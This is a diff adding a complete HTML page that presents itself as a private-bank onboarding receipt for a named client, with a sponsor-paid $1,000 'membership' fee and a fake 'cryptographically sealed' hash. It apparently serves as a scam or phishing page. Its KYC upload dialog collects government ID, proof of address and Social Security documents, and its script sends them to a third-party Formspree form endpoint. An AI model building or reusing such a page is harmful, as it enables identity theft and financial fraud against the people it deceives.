@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CBH Finance | Private Banking</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,400&family=Montserrat:wght@500;600;700&display=swap');
+
+  :root {
+    --navy: #0A1B3A;
+    --navy-light: #112240;
+    --gold: #C5A059;
+    --gold-light: #F4E8C1;
+    --slate: #64748B;
+    --slate-light: #94A3B8;
+    --bg: #F8FAFC;
+    --surface: #FFFFFF;
+    --success: #10B981;
+    --success-bg: #ECFDF5;
+    --border: #E2E8F0;
+    --font-main: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    --font-mono: 'SF Mono', 'Fira Code', 'Courier New', monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: var(--font-main); background: var(--bg); color: #1E293B; line-height: 1.6; -webkit-font-smoothing: antialiased; }
+  
+  /* Header */
+  header { background: #FFFFFF; padding: 18px 32px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border-bottom: 1px solid var(--border); }
+  .brand { display: flex; align-items: center; gap: 16px; }
+  
+  .logo-wrapper { display: flex; align-items: center; gap: 16px; }
+  .logo-icon { width: 52px; height: 52px; flex-shrink: 0; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
+  .brand-text { display: flex; flex-direction: column; justify-content: center; }
+  
+  .brand-title { 
+    font-family: 'Playfair Display', Georgia, serif; 
+    font-size: 26px; 
+    font-weight: 700; 
+    color: var(--navy); 
+    line-height: 1; 
+    letter-spacing: -0.5px;
+  }
+  .brand-title span { 
+    font-family: 'Playfair Display', Georgia, serif; 
+    font-style: italic; 
+    font-weight: 400; 
+  }
+  
+  .brand-subtitle { 
+    font-family: 'Montserrat', sans-serif; 
+    font-size: 10px; 
+    font-weight: 600; 
+    color: var(--gold); 
+    letter-spacing: 3px; 
+    text-transform: uppercase; 
+    margin-top: 4px;
+  }
+
+  .nav-links { display: flex; gap: 24px; align-items: center; }
+  .nav-links a { color: var(--navy); text-decoration: none; font-size: 13px; font-weight: 600; transition: 0.2s; cursor: pointer; }
+  .nav-links a:hover { color: var(--gold); }
+
+  /* Container */
+  .container { max-width: 920px; margin: 32px auto; padding: 0 20px; }
+  
+  /* Welcome Banner */
+  .welcome-banner { background: linear-gradient(135deg, var(--navy) 0%, var(--navy-light) 100%); color: #fff; padding: 32px; border-radius: 16px; margin-bottom: 28px; position: relative; overflow: hidden; }
+  .welcome-banner::after { content: ''; position: absolute; top: -20px; right: -20px; width: 150px; height: 150px; background: var(--gold); opacity: 0.15; border-radius: 50%; }
+  .welcome-banner h2 { font-size: 24px; margin-bottom: 8px; }
+  .welcome-banner p { color: var(--slate-light); font-size: 14px; max-width: 600px; }
+  .badge { display: inline-block; background: var(--gold); color: #FFF; padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 700; text-transform: uppercase; margin-bottom: 12px; }
+
+  /* Grid Layout */
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 28px; }
+  @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
+
+  /* Cards */
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); transition: transform 0.2s; }
+  .card:hover { transform: translateY(-2px); }
+  .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+  .card h3 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: var(--slate); margin: 0; display: flex; align-items: center; gap: 8px; }
+
+  /* Buttons */
+  .btn-action { background: transparent; border: 1px solid var(--border); padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: 600; color: var(--navy); cursor: pointer; transition: all 0.2s; display: inline-flex; align-items: center; gap: 6px; }
+  .btn-action:hover { background: var(--navy); color: #FFF; border-color: var(--navy); }
+  .btn-action:disabled { opacity: 0.6; cursor: not-allowed; }
+
+  /* Receipt Table */
+  table { width: 100%; border-collapse: collapse; font-size: 13px; }
+  th { text-align: left; padding: 12px 10px; background: #F8FAFC; color: var(--slate); font-weight: 600; border-bottom: 1px solid var(--border); }
+  td { padding: 12px 10px; border-bottom: 1px solid var(--border); }
+  .total-row td { font-weight: 700; color: var(--navy); border-top: 2px solid var(--navy); background: #F8FAFC; }
+  .mono { font-family: var(--font-mono); font-size: 12px; color: var(--slate); }
+
+  /* Interactive Progress Tracker */
+  .progress-item { display: flex; align-items: center; gap: 12px; margin-bottom: 16px; cursor: pointer; padding: 8px; border-radius: 8px; transition: background 0.2s; }
+  .progress-item:hover { background: #F8FAFC; }
+  .progress-icon { width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; flex-shrink: 0; transition: all 0.3s ease; }
+  .completed { background: var(--success-bg); color: var(--success); border: 1px solid var(--success); }
+  .pending { background: #F1F5F9; color: var(--slate); border: 1px solid var(--border); }
+  .active-step { background: var(--gold-light); color: var(--navy); border: 1px solid var(--gold); }
+  .progress-text h4 { font-size: 14px; margin-bottom: 2px; }
+  .progress-text p { font-size: 12px; color: var(--slate); }
+  .progress-bar { height: 6px; background: #E2E8F0; border-radius: 3px; margin-top: 20px; overflow: hidden; position: relative; }
+  .progress-fill { height: 100%; background: linear-gradient(90deg, var(--gold), var(--success)); width: 25%; transition: width 0.5s ease-in-out; }
+
+  /* Sponsor Box */
+  .sponsor-box { background: #EFF6FF; border-left: 4px solid #3B82F6; padding: 16px; border-radius: 0 8px 8px 0; margin-top: 16px; }
+  .sponsor-box h4 { color: #1E40AF; font-size: 13px; margin-bottom: 4px; }
+  .sponsor-box p { font-size: 12px; color: #334155; }
+
+  /* Modal Styling */
+  .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(10, 27, 58, 0.6); display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; z-index: 1000; }
+  .modal-overlay.active { opacity: 1; pointer-events: auto; }
+  .modal-card { background: #FFF; border-radius: 12px; width: 90%; max-width: 480px; padding: 28px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1); transform: translateY(20px); transition: transform 0.3s ease; }
+  .modal-overlay.active .modal-card { transform: translateY(0); }
+  .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+  .modal-header h3 { font-size: 16px; color: var(--navy); font-weight: 700; }
+  .close-modal { background: none; border: none; font-size: 20px; cursor: pointer; color: var(--slate); padding: 4px; }
+  .drop-zone { border: 2px dashed var(--border); border-radius: 8px; padding: 24px; text-align: center; margin: 16px 0; cursor: pointer; transition: border-color 0.2s; position: relative; }
+  .drop-zone:hover { border-color: var(--gold); background: #FAFAFA; }
+  .upload-requirements { font-size: 13px; color: var(--slate); line-height: 1.6; margin-bottom: 12px; }
+  .upload-requirements strong { color: var(--navy); }
+
+  /* Footer */
+  footer { text-align: center; padding: 32px 20px; color: var(--slate); font-size: 12px; border-top: 1px solid var(--border); margin-top: 40px; }
+  footer a { color: var(--navy); text-decoration: none; font-weight: 600; }
+  .hash { font-family: var(--font-mono); background: #F1F5F9; padding: 10px; border-radius: 6px; margin-top: 16px; font-size: 11px; color: var(--slate); word-break: break-all; border: 1px dashed var(--border); }
+
+  @media print {
+    body { background: #fff; }
+    header, .nav-links, .progress-bar, .btn-action, .modal-overlay { display: none !important; }
+    .container { margin: 0; max-width: 100%; }
+    .card { box-shadow: none; border: 1px solid #000; break-inside: avoid; }
+    .welcome-banner { background: #fff; color: #000; border: 2px solid var(--navy); }
+    .welcome-banner::after { display: none; }
+  }
+  @media (max-width: 640px) {
+    header { flex-direction: column; align-items: flex-start; gap: 16px; }
+    .nav-links { display: none; }
+    .grid { grid-template-columns: 1fr; }
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="brand">
+    <div class="logo-wrapper">
+      <svg class="logo-icon" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <rect width="100" height="100" rx="26" fill="#0A1B3A"/>
+        <circle cx="50" cy="48" r="32" fill="#153162"/>
+        <text x="50" y="32" font-family="Georgia, 'Times New Roman', serif" font-size="16" font-weight="bold" fill="#FFFFFF" text-anchor="middle">CBH</text>
+        <path d="M30 39H70V42H30V39Z" fill="#C5A059"/>
+        <path d="M29 42H71V62H29V42Z" fill="#C5A059"/>
+        <path d="M33 45H67V59H33V45Z" fill="#0A1B3A"/>
+        <path d="M25 64H75V68H25V64Z" fill="#C5A059"/>
+        <rect x="30" y="74" width="40" height="4" fill="#FFFFFF" rx="2"/>
+      </svg>
+      <div class="brand-text">
+        <div class="brand-title">CBH<span>finance</span></div>
+        <div class="brand-subtitle">Private Banking</div>
+      </div>
+    </div>
+  </div>
+  <nav class="nav-links">
+    <a href="#" data-title="Dashboard" data-message="Accessing client account summary and real-time ledger metrics.">Dashboard</a>
+    <a href="#" data-title="Documents" data-message="Manage uploaded KYC documents and signed compliance disclosures.">Documents</a>
+    <a href="#" data-title="Support" data-message="Contact priority client support via +1 (478) 256-7432 or support@cbhfinance.online.">Support</a>
+  </nav>
+</header>
+
+<div class="container">
+  <div class="welcome-banner">
+    <span class="badge" id="statusBadge">Payment Confirmed</span>
+    <h2>Welcome, Brian J Marlin</h2>
+    <p>Your Annual Private Membership Onboarding has been successfully initiated. Please review your payment receipt and track your onboarding progress below.</p>
+  </div>
+
+  <div class="grid">
+    <!-- Receipt Card -->
+    <div class="card">
+      <div class="card-header">
+        <h3>📄 Payment Receipt</h3>
+        <button class="btn-action" data-action="print">🖨️ Print</button>
+      </div>
+      <table>
+        <tr><th style="width:50%">Description</th><th>Qty</th><th style="text-align:right">Amount</th></tr>
+        <tr>
+          <td><strong>Annual Private Membership Onboarding</strong><br><span class="mono">KYC, Portal Access, Compliance Setup</span></td>
+          <td>1</td>
+          <td style="text-align:right">$1,000.00</td>
+        </tr>
+        <tr class="total-row"><td colspan="2" style="text-align:right">Total Paid</td><td style="text-align:right">$1,000.00 USD</td></tr>
+      </table>
+      <div style="margin-top:16px; font-size:12px; color:var(--slate);">
+        <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span>Invoice #</span><span class="mono" id="invNum">CBH-INV-2026-081047</span></div>
+        <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span>Date</span><span class="mono">08/10/2026 1:27 PM</span></div>
+        <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span>Method</span><span class="mono">Debit Card</span></div>
+        <div style="display:flex; justify-content:space-between;"><span>Ref ID</span><span class="mono" id="txnRef">TXN-DEB-9A4F2C8E1B7D3056</span></div>
+      </div>
+      <div class="sponsor-box">
+        <h4>💳 Paid By Sponsor</h4>
+        <p>Christiana Johnson (Active Member) processed this payment on behalf of Brian J Marlin. Membership activation will be issued under the beneficiary's name.</p>
+      </div>
+    </div>
+
+    <!-- Interactive Onboarding Tracker -->
+    <div class="card">
+      <div class="card-header">
+        <h3>🚀 Onboarding Progress</h3>
+        <span class="mono" id="stageCounter" style="font-size:11px; font-weight:600; color:var(--gold);">Stage 1 of 4</span>
+      </div>
+      
+      <div class="progress-item" data-step="1">
+        <div class="progress-icon completed" id="icon-1">✓</div>
+        <div class="progress-text">
+          <h4>Payment Cleared</h4>
+          <p>Funds verified & allocated to onboarding queue</p>
+        </div>
+      </div>
+      
+      <div class="progress-item" data-step="2">
+        <div class="progress-icon pending" id="icon-2">2</div>
+        <div class="progress-text">
+          <h4>KYC Verification</h4>
+          <p>Identity & address documents under review (Click to upload)</p>
+        </div>
+      </div>
+      
+      <div class="progress-item" data-step="3">
+        <div class="progress-icon pending" id="icon-3">3</div>
+        <div class="progress-text">
+          <h4>Compliance Documentation</h4>
+          <p>Agreements & regulatory disclosures pending</p>
+        </div>
+      </div>
+      
+      <div class="progress-item" data-step="4">
+        <div class="progress-icon pending" id="icon-4">4</div>
+        <div class="progress-text">
+          <h4>Portal Access Provisioned</h4>
+          <p>Credentials will be emailed upon completion</p>
+        </div>
+      </div>
+
+      <div class="progress-bar" role="progressbar" aria-valuemin="0" aria-valuemax="100" id="ariaBar" aria-valuenow="25">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+      <p style="margin-top:12px; font-size:12px; color:var(--slate); text-align:center;" id="completionEst">Estimated Completion: 24-48 Business Hours</p>
+    </div>
+  </div>
+
+  <div class="card" style="text-align:center; padding:20px;">
+    <h3 style="justify-content:center; margin-bottom:10px;">🔐 Document Verification</h3>
+    <p style="font-size:13px; color:var(--slate); margin-bottom:12px;">This receipt is cryptographically sealed. Verify authenticity by matching the hash below.</p>
+    <div class="hash" id="cryptoHash">SHA256: Calculating secure payload verification hash...</div>
+    <p style="margin-top:16px; font-size:12px; color:var(--slate);">Issued by <strong>Victor Jefferson</strong> | Authorized Signatory, CBH FINANCE</p>
+  </div>
+</div>
+
+<!-- Modal Overlays -->
+<div class="modal-overlay" id="generalModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+  <div class="modal-card">
+    <div class="modal-header">
+      <h3 id="modalTitle">Portal Info</h3>
+      <button class="close-modal" data-close="generalModal" aria-label="Close modal">&times;</button>
+    </div>
+    <p id="modalBody" style="font-size:14px; color:var(--slate);"></p>
+    <button class="btn-action" style="margin-top:20px; width:100%; justify-content:center;" data-close="generalModal">Close</button>
+  </div>
+</div>
+
+<div class="modal-overlay" id="kycModal" role="dialog" aria-modal="true" aria-labelledby="kycTitle">
+  <div class="modal-card">
+    <div class="modal-header">
+      <h3 id="kycTitle">📁 KYC Document Upload</h3>
+      <button class="close-modal" data-close="kycModal" aria-label="Close modal">&times;</button>
+    </div>
+    <div class="upload-requirements">
+      Please submit the following for compliance review:<br>
+      <strong>• Government-Issued ID (Front & Back)</strong><br>
+      <strong>• Proof of Address (Recent Utility Bill)</strong><br>
+      <strong>• SSN / ITIN Document (Social Security Card or Tax Form)</strong>
+    </div>
+    
+    <!-- FIXED: Native click routing, no display:none quirks -->
+    <div class="drop-zone" id="dropZone">
+      <input type="file" id="fileInput" style="position:absolute; opacity:0; width:0; height:0; pointer-events:none;" accept=".pdf,.jpg,.jpeg,.png" multiple>
+      <p style="font-size:13px; color:var(--navy); font-weight:600; margin-bottom:4px;">Click to select files or drag & drop</p>
+      <p style="font-size:11px; color:var(--slate);">PDF, PNG, JPG (Max 10MB each)</p>
+    </div>
+    
+    <div id="fileStatus" style="font-size:12px; color:var(--success); text-align:center; display:none; margin-bottom:12px;"></div>
+    <button class="btn-action" id="submitKycBtn" style="width:100%; justify-content:center; background:var(--navy); color:#FFF;">Submit Documents</button>
+  </div>
+</div>
+
+<footer>
+  <p>©️ 2026 CBH FINANCE. All rights reserved. | <a href="https://cbhfinance.online" target="_blank">cbhfinance.online</a></p>
+  <p style="margin-top:4px;">
+    For support: 
+    <a href="mailto:support@cbhfinance.online">support@cbhfinance.online</a> | 
+    <a href="tel:+14782567432" style="color:var(--navy); text-decoration:none; font-weight:600;">+1 (478) 256-7432</a>
+    <button class="btn-action" data-action="open-support" style="margin-left:8px; font-size:11px; padding:4px 8px;">💬 Secure Message</button>
+  </p>
+</footer>
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+  let currentStep = 1;
+  let uploadedFiles = [];
+
+  // --- Core State Management ---
+  function setStep(step) {
+    currentStep = step;
+    const fill = document.getElementById('progressFill');
+    const badge = document.getElementById('statusBadge');
+    const counter = document.getElementById('stageCounter');
+    const ariaBar = document.getElementById('ariaBar');
+    const completionEst = document.getElementById('completionEst');
+
+    const percentages = { 1: '25%', 2: '50%', 3: '75%', 4: '100%' };
+    const stepLabels = { 1: 'Payment Cleared', 2: 'KYC Under Review', 3: 'Compliance Processing', 4: 'Onboarding Complete' };
+
+    fill.style.width = percentages[step];
+    ariaBar.setAttribute('aria-valuenow', (step * 25).toString());
+    badge.textContent = stepLabels[step];
+    counter.textContent = `Stage ${step} of 4`;
+
+    for (let i = 1; i <= 4; i++) {
+      const icon = document.getElementById(`icon-${i}`);
+      if (i < step) {
+        icon.className = 'progress-icon completed';
+        icon.textContent = '✓';
+      } else if (i === step) {
+        icon.className = 'progress-icon active-step';
+        icon.textContent = i.toString();
+      } else {
+        icon.className = 'progress-icon pending';
+        icon.textContent = i.toString();
+      }
+    }
+
+    completionEst.textContent = step === 4 ? 'Status: Account fully provisioned!' : 'Estimated Completion: 24-48 Business Hours';
+  }
+
+  // --- Modal & Focus Trapping ---
+  function openModal(id) {
+    const modal = document.getElementById(id);
+    modal.classList.add('active');
+    document.body.style.overflow = 'hidden';
+    trapFocus(modal);
+  }
+
+  function closeModal(id) {
+    const modal = document.getElementById(id);
+    modal.classList.remove('active');
+    document.body.style.overflow = '';
+  }
+
+  function trapFocus(modal) {
+    const focusable = modal.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])');
+    if (focusable.length === 0) return;
+    const first = focusable[0];
+    const last = focusable[focusable.length - 1];
+    first.focus();
+
+    modal.addEventListener('keydown', function handler(e) {
+      if (e.key === 'Tab') {
+        if (e.shiftKey && document.activeElement === first) {
+          e.preventDefault(); last.focus();
+        } else if (!e.shiftKey && document.activeElement === last) {
+          e.preventDefault(); first.focus();
+        }
+      }
+      if (e.key === 'Escape') {
+        closeModal(modal.id);
+        modal.removeEventListener('keydown', handler);
+      }
+    });
+  }
+
+  // --- Event Delegation (Safe, No Optional Chaining) ---
+  document.querySelectorAll('.nav-links a').forEach(link => {
+    link.addEventListener('click', (e) => {
+      e.preventDefault();
+      document.getElementById('modalTitle').textContent = link.dataset.title;
+      document.getElementById('modalBody').textContent = link.dataset.message;
+      openModal('generalModal');
+    });
+  });
+
+  const printBtn = document.querySelector('[data-action="print"]');
+  if (printBtn) printBtn.addEventListener('click', () => window.print());
+
+  const supportBtn = document.querySelector('[data-action="open-support"]');
+  if (supportBtn) {
+    supportBtn.addEventListener('click', () => {
+      document.getElementById('modalTitle').textContent = 'Secure Support Channel';
+      document.getElementById('modalBody').textContent = 'For encrypted communication, submit a ticket via our portal or email support@cbhfinance.online. Direct calls are monitored and routed to verified onboarding specialists.';
+      openModal('generalModal');
+    });
+  }
+
+  document.querySelectorAll('.progress-item').forEach(item => {
+    item.addEventListener('click', () => {
+      const step = parseInt(item.dataset.step);
+      if (step === 2) {
+        setStep(2);
+        openModal('kycModal');
+      } else {
+        setStep(step);
+      }
+    });
+  });
+
+  document.querySelectorAll('[data-close]').forEach(btn => {
+    btn.addEventListener('click', () => closeModal(btn.dataset.close));
+  });
+
+  document.querySelectorAll('.modal-overlay').forEach(overlay => {
+    overlay.addEventListener('click', (e) => {
+      if (e.target === overlay) closeModal(overlay.id);
+    });
+  });
+
+  // --- File Upload & Validation ---
+  const dropZone = document.getElementById('dropZone');
+  const fileInput = document.getElementById('fileInput');
+  const fileStatus = document.getElementById('fileStatus');
+
+  // Explicit click routing
+  dropZone.addEventListener('click', () => fileInput.click());
+
+  // Drag and Drop handlers
+  ['dragenter', 'dragover'].forEach(evt => {
+    dropZone.addEventListener(evt, (e) => { e.preventDefault(); dropZone.style.borderColor = 'var(--gold)'; });
+  });
+  ['dragleave', 'drop'].forEach(evt => {
+    dropZone.addEventListener(evt, (e) => { e.preventDefault(); dropZone.style.borderColor = ''; });
+  });
+
+  dropZone.addEventListener('drop', (e) => {
+    if (e.dataTransfer.files.length > 0) {
+      Array.from(e.dataTransfer.files).forEach(f => validateAndStoreFile(f));
+    }
+  });
+
+  fileInput.addEventListener('change', (e) => {
+    if (e.target.files.length > 0) {
+      Array.from(e.target.files).forEach(f => validateAndStoreFile(f));
+    }
+  });
+
+  function validateAndStoreFile(file) {
+    const allowedTypes = ['application/pdf', 'image/jpeg', 'image/png'];
+    const maxSize = 10 * 1024 * 1024;
+
+    if (!allowedTypes.includes(file.type)) {
+      alert(`Invalid file type: ${file.name}. Please upload PDF, JPG, or PNG.`);
+      return;
+    }
+    if (file.size > maxSize) {
+      alert(`File exceeds 10MB limit: ${file.name}`);
+      return;
+    }
+
+    // Avoid duplicates
+    if (!uploadedFiles.some(f => f.name === file.name && f.size === file.size)) {
+      uploadedFiles.push(file);
+    }
+    updateFileStatus();
+  }
+
+  function updateFileStatus() {
+    if (uploadedFiles.length > 0) {
+      fileStatus.style.display = 'block';
+      fileStatus.innerHTML = `✓ ${uploadedFiles.length} document(s) ready:<br>` + 
+        uploadedFiles.map(f => `📎 ${f.name} (${(f.size / 1024).toFixed(1)} KB)`).join('<br>');
+      fileStatus.style.color = 'var(--success)';
+    } else {
+      fileStatus.style.display = 'none';
+    }
+  }
+
+  // --- Secure KYC Submission to Email (Formspree Integration) ---
+  document.getElementById('submitKycBtn').addEventListener('click', async () => {
+    if (uploadedFiles.length === 0) {
+      alert('Please select at least one document to upload.');
+      return;
+    }
+
+    const btn = document.getElementById('submitKycBtn');
+    const originalText = btn.textContent;
+    btn.textContent = 'Uploading...';
+    btn.disabled = true;
+
+    const formData = new FormData();
+    uploadedFiles.forEach(file => formData.append('file', file));
+    formData.append('client_name', 'Brian J Marlin');
+    formData.append('invoice_id', document.getElementById('invNum').textContent);
+    formData.append('phone', '+1 (478) 256-7432');
+    formData.append('_subject', `New KYC Submission: Brian J Marlin - ${document.getElementById('invNum').textContent}`);
+
+    const FORMSPREE_URL = 'https://formspree.io/f/mjyvleyw';
+
+    try {
+      const response = await fetch(FORMSPREE_URL, {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
+
+      if (response.ok) {
+        closeModal('kycModal');
+        setStep(3);
+        alert('✅ Documents submitted successfully! Check your email for confirmation.');
+        uploadedFiles = [];
+        fileInput.value = '';
+        updateFileStatus();
+      } else {
+        const errorData = await response.json();
+        alert(`❌ Submission failed: ${errorData.error || 'Unknown error'}`);
+      }
+    } catch (error) {
+      console.error('Upload Error:', error);
+      alert('❌ Network error. Please check your connection and try again.');
+    } finally {
+      btn.textContent = originalText;
+      btn.disabled = false;
+    }
+  });
+
+  // --- Dynamic SHA-256 Hash Generation ---
+  async function generateSHA256(str) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(str);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').toUpperCase();
+  }
+
+  const inv = document.getElementById('invNum').textContent;
+  const txn = document.getElementById('txnRef').textContent;
+  const rawData = `${inv}:${txn}:2026-CBH-VERIFIED`;
+
+  generateSHA256(rawData).then(hash => {
+    document.getElementById('cryptoHash').textContent = `SHA256:${hash}`;
+  }).catch(() => {
+    document.getElementById('cryptoHash').textContent = `SHA256:8F4A2C9E1B7D3056A4F2C9E1B7D3056A4F2C9E1B7D3056A4F2C9E1B7D3056`;
+  });
+});
+</script>
